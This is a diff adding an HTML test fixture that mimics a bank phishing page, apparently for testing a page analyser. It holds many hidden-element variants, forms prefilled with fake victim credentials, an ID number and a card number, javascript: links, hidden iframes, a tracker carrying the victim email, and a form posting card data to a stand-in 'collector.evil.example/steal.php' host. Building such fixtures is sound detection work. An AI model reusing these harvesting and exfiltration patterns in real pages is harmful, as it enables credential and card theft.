@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <base href="https://cdn.bank-site.example/app/">
+  <title>  Secure   Login </title>
+  <meta name="description" content="Sign in to your account">
+  <meta name="keywords" content="bank, login">
+  <meta property="og:title" content="Bank">
+  <meta http-equiv="refresh" content="5; url=/next?user=victim@mail.com">
+  <link rel="stylesheet" href="css/site.css">
+  <link rel="stylesheet" href="https://fonts.cdn-provider.example/font.css">
+  <style>.box { color: red; } body { font-family: STYLE_MARKER; }</style>
+  <script type="application/ld+json">{"@context": "https://schema.org", "@type": "Organization"}</script>
+  <script>var headScript = 1;</script>
+  <script src="js/app.js" defer integrity="sha384-abc" crossorigin="anonymous"></script>
+  <script src="https://tracker.other-site.example/t.js?email=victim@mail.com" async></script>
+</head>
+<body onload="init()">
+  <!-- kit by phisher v2 -->
+  <!-- second comment -->
+  <h1>Welcome back</h1>
+  <h3>Step one</h3>
+  <p>First paragraph.</p>
+  <p>   </p>
+  <p>Second <b>bold</b> paragraph.</p>
+  <div style="display:none">Hidden by display none</div>
+  <div hidden>Hidden by attribute</div>
+  <span aria-hidden="true">Hidden by aria</span>
+  <p style="opacity: 0">Hidden by opacity</p>
+  <p style="font-size:0px">Hidden by font size</p>
+  <noscript>Please enable JavaScript</noscript>
+  <ul><li>Item one</li><li>Item two</li></ul>
+
+  <form id="login" action="post.php?email=victim@mail.com&amp;lang=en" method="post">
+    <label for="email">Email address</label>
+    <input type="email" id="email" name="email" value="victim@mail.com" required autocomplete="username">
+    <label>Password <input type="password" name="pw" value="secret123"></label>
+    <input type="hidden" name="phone" value="0771234567">
+    <input type="text" name="nic" value="199012345678" style="visibility:hidden" maxlength="12">
+    <select name="country"><option value="lk" selected>Sri Lanka</option><option value="in">India</option></select>
+    <textarea name="note">Call +94 77 123 4567</textarea>
+    <button type="submit">Sign in</button>
+    <input type="submit" value="Go">
+  </form>
+  <form action="" method="get"><input type="search" name="q"></form>
+  <form action="https://collector.evil.example/steal.php"><input type="text" name="card" value="4111 1111 1111 1111"></form>
+  <form action="#"><input type="text" name="a"></form>
+  <form action="javascript:void(0)"><input type="text" name="b"></form>
+
+  <input type="text" id="otp" name="otp" placeholder="Enter OTP" aria-label="One-time code">
+  <input type="tel" name="mobile" form="login">
+
+  <a href="/help">Help</a>
+  <a href="https://www.bank-site.example/about" rel="noopener" target="_blank">About</a>
+  <a href="https://other-site.example/x?ref=abc">Other</a>
+  <a href="javascript:alert(1)">Click</a>
+  <a href="mailto:support@bank-site.example">Mail us</a>
+  <button onclick="doSomething()">Help me</button>
+  <img src="javascript:evil()" alt="x">
+
+  <iframe src="https://ads.other-site.example/frame" width="0" height="0"></iframe>
+  <iframe src="frame.html" style="display:none"></iframe>
+  <iframe src="https://video.example/embed" width="560" height="315"></iframe>
+  <embed src="file.swf">
+
+  <script type="text/template"><div class="tpl">{{name}}</div></script>
+  <script>
+    document.getElementById("login").addEventListener("submit", function () {});
+  </script>
+  <script type="module">import x from "./x.js";</script>
+</body>
+</html>
